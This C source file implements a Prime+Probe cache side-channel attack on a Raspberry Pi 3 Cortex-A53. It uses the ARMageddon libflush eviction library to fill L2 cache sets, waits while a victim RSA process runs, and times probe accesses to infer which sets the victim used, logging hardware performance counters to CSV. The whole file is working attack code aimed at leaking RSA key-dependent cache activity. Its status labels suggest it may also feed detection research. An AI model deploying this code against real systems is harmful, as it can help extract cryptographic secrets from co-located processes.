#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <time.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <linux/perf_event.h>
#include <asm/unistd.h>

/* ── ARMageddon libflush ── */
#include "libflush.h"

/*
 * PRIME+PROBE ATTACK
 * ══════════════════
 * PRIME:  Use libflush_evict() with ARMageddon strategy (e=21,a=1,d=6)
 *         to fill target cache sets with OUR data
 *
 * WAIT:   Let victim (RSA) run — if it uses those cache sets,
 *         it will evict OUR data and load its own
 *
 * PROBE:  Re-access our data and measure time:
 *         FAST (<threshold) = our data still in cache
 *                           = victim did NOT use this set
 *         SLOW (>threshold) = our data was evicted
 *                           = victim DID use this set ← SIGNAL
 *
 * No shared memory needed — we only need to know
 * which cache SETS the victim uses, not exact addresses.
 */

/* ── Cortex-A53 cache geometry ── */
#define CACHE_SIZE        (512 * 1024)   /* 512 KB L2         */
#define CACHE_WAYS        16             /* 16-way            */
#define CACHE_LINE_SIZE   64             /* 64 byte lines     */
#define CACHE_SETS        (CACHE_SIZE / (CACHE_WAYS * CACHE_LINE_SIZE))
                                         /* = 512 sets        */
/* Stride to address consecutive cache sets:
 * To move from set N to set N+1: add LINE_SIZE bytes
 * To stay in set N but different way: add CACHE_SETS*LINE_SIZE */
#define SET_STRIDE        (CACHE_SETS * CACHE_LINE_SIZE)  /* 32768 B */

/* Buffer needs WAYS+1 lines per set to guarantee eviction
 * We monitor MONITORED_SETS sets simultaneously            */
#define MONITORED_SETS    64
#define LINES_PER_SET     (CACHE_WAYS + 1)                /* 17     */
#define BUFFER_SIZE       (MONITORED_SETS * LINES_PER_SET * SET_STRIDE)

/* ── Attack parameters ── */
#define THRESHOLD_NS      180
#define NUM_ROUNDS        1000
#define WAIT_NS           500000    /* 0.5ms — RSA op takes ~11ms  */

/* ── Timing ── */
static inline uint64_t now_ns(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ULL + ts.tv_nsec;
}

static inline uint64_t timed_access(volatile uint8_t *p) {
    uint64_t t1 = now_ns();
    (void)*p;
    return now_ns() - t1;
}

/* ── HPC ── */
static long perf_event_open(struct perf_event_attr *hw_event,
    pid_t pid, int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, hw_event, pid, cpu, group_fd, flags);
}

int open_hpc(int cpu, uint32_t type, uint64_t config) {
    struct perf_event_attr pe;
    memset(&pe, 0, sizeof(pe));
    pe.type           = type;
    pe.size           = sizeof(pe);
    pe.config         = config;
    pe.disabled       = 0;
    pe.exclude_kernel = 0;
    pe.exclude_hv     = 1;
    int fd = perf_event_open(&pe, -1, cpu, -1, 0);
    if (fd < 0) perror("perf_event_open");
    return fd;
}

/*
 * PRIME step
 * ══════════
 * For each monitored cache set:
 *   Use libflush_evict() on LINES_PER_SET addresses that all
 *   map to that set — this fills the set with OUR data using
 *   the ARMageddon eviction strategy internally
 */
void prime(libflush_session_t *session,
           volatile uint8_t *buf,
           int num_sets) {
    for (int set = 0; set < num_sets; set++) {
        for (int way = 0; way < LINES_PER_SET; way++) {
            /* Each line maps to same cache set (set),
             * different way (way * SET_STRIDE apart)  */
            size_t offset = (size_t)set  * CACHE_LINE_SIZE +
                            (size_t)way  * SET_STRIDE;
            /* libflush_evict uses e=21,a=1,d=6 strategy
             * to ensure this line is in cache           */
            libflush_evict(session, (void*)(buf + offset));
        }
    }
}

/*
 * PROBE step
 * ══════════
 * For each monitored cache set:
 *   Measure access time to first line of that set
 *   SLOW = victim evicted our data = victim used this set
 */
int probe(volatile uint8_t *buf,
          int num_sets,
          uint64_t *timings) {
    int evicted = 0;
    for (int set = 0; set < num_sets; set++) {
        size_t offset  = (size_t)set * CACHE_LINE_SIZE;
        timings[set]   = timed_access(&buf[offset]);
        if (timings[set] > THRESHOLD_NS) evicted++;
    }
    return evicted;
}

int main(void) {
    printf("═══════════════════════════════════════════════\n");
    printf("  Prime+Probe Attack — ARMageddon libflush\n");
    printf("  RPi3 Cortex-A53\n");
    printf("═══════════════════════════════════════════════\n");
    printf("Strategy:      e=%d a=%d d=%d\n",
           ES_EVICTION_COUNTER,
           ES_NUMBER_OF_ACCESSES_IN_LOOP,
           ES_DIFFERENT_ADDRESSES_IN_LOOP);
    printf("Cache:         %d KB, %d ways, %d sets\n",
           CACHE_SIZE/1024, CACHE_WAYS, CACHE_SETS);
    printf("Monitoring:    %d cache sets\n", MONITORED_SETS);
    printf("Threshold:     %d ns\n", THRESHOLD_NS);
    printf("Rounds:        %d\n\n", NUM_ROUNDS);

    /* ── Pin attacker to core 0 ── */
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(0, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);

    /* ── Init libflush ── */
    libflush_session_t *session;
    libflush_session_args_t args;
    memset(&args, 0, sizeof(args));
    if (libflush_init(&session, &args) == false) {
        fprintf(stderr, "[-] libflush_init failed\n");
        return 1;
    }
    printf("[+] libflush initialised (eviction strategy active)\n");

    /* ── Allocate probe buffer ── */
    printf("[+] Allocating %zu KB probe buffer...\n",
           BUFFER_SIZE/1024);
    volatile uint8_t *buf = mmap(NULL, BUFFER_SIZE,
        PROT_READ|PROT_WRITE,
        MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
    if (buf == MAP_FAILED) { perror("mmap"); return 1; }
    /* Warm up — touch every cache line we'll use */
    for (size_t i = 0; i < BUFFER_SIZE; i += CACHE_LINE_SIZE)
        buf[i] = 0xAB;
    printf("[+] Buffer ready at %p\n\n", (void*)buf);

    /* ── HPC on core 1 (victim core) ── */
    int fd_miss  = open_hpc(1, PERF_TYPE_HARDWARE,
                             PERF_COUNT_HW_CACHE_MISSES);
    int fd_refs  = open_hpc(1, PERF_TYPE_HARDWARE,
                             PERF_COUNT_HW_CACHE_REFERENCES);
    int fd_cycle = open_hpc(1, PERF_TYPE_HARDWARE,
                             PERF_COUNT_HW_CPU_CYCLES);
    int fd_inst  = open_hpc(1, PERF_TYPE_HARDWARE,
                             PERF_COUNT_HW_INSTRUCTIONS);
    if (fd_miss<0||fd_refs<0||fd_cycle<0||fd_inst<0) {
        fprintf(stderr, "[-] HPC setup failed\n");
        return 1;
    }
    printf("[+] HPC counters active on core 1\n\n");

    /* ── CSV header ── */
    printf("Round,Evicted_Sets,Eviction_Rate_Pct,"
           "Avg_Probe_ns,Max_Probe_ns,"
           "HPC_Misses,HPC_Refs,Miss_Rate_Pct,"
           "Cycles,Instructions,Status\n");

    uint64_t timings[MONITORED_SETS];
    long long pm=0, pr=0, pc=0, pi=0;
    long total_evicted = 0;

    for (int round = 0; round < NUM_ROUNDS; round++) {

        /* ── Read HPC delta ── */
        long long cm, cr, cc, ci;
        read(fd_miss,  &cm, sizeof(cm));
        read(fd_refs,  &cr, sizeof(cr));
        read(fd_cycle, &cc, sizeof(cc));
        read(fd_inst,  &ci, sizeof(ci));
        long long dm=cm-pm, dr=cr-pr, dc=cc-pc, di=ci-pi;
        pm=cm; pr=cr; pc=cc; pi=ci;
        double miss_rate = (dr>0) ? (double)dm/dr*100.0 : 0.0;

        /* ══ PRIME ══
         * Fill monitored cache sets with our data
         * using ARMageddon eviction strategy         */
        prime(session, buf, MONITORED_SETS);

        /* ══ WAIT ══
         * Let victim run — RSA ops will use cache sets
         * containing BN_mod_exp_mont, BN_mod_sqr etc  */
        struct timespec wait = {0, WAIT_NS};
        nanosleep(&wait, NULL);

        /* ══ PROBE ══
         * Measure which sets were displaced by victim  */
        int evicted = probe(buf, MONITORED_SETS, timings);
        total_evicted += evicted;

        /* Stats on probe timings */
        uint64_t sum=0, max=0;
        for (int s=0; s<MONITORED_SETS; s++) {
            sum += timings[s];
            if (timings[s] > max) max = timings[s];
        }
        uint64_t avg = sum / MONITORED_SETS;
        double evict_rate = (double)evicted / MONITORED_SETS * 100.0;

        /* ── Classify ── */
        const char *status;
        if      (evicted > MONITORED_SETS * 0.5) status = "ATTACK_DETECTED";
        else if (evicted > MONITORED_SETS * 0.2) status = "SUSPICIOUS";
        else                                      status = "NORMAL";

        printf("%d,%d,%.1f,%lu,%lu,%lld,%lld,%.2f,%lld,%lld,%s\n",
               round, evicted, evict_rate,
               avg, max,
               dm, dr, miss_rate,
               dc, di, status);
        fflush(stdout);
    }

    /* ── Summary ── */
    printf("\n═══════════════════════════════════════════════\n");
    printf("  SUMMARY (%d rounds)\n", NUM_ROUNDS);
    printf("═══════════════════════════════════════════════\n");
    printf("Total evicted sets : %ld\n", total_evicted);
    printf("Avg evicted/round  : %.2f / %d sets (%.1f%%)\n",
           (double)total_evicted/NUM_ROUNDS,
           MONITORED_SETS,
           (double)total_evicted/NUM_ROUNDS/MONITORED_SETS*100);
    printf("═══════════════════════════════════════════════\n");

    libflush_terminate(session);
    munmap((void*)buf, BUFFER_SIZE);
    close(fd_miss); close(fd_refs);
    close(fd_cycle); close(fd_inst);
    return 0;
}
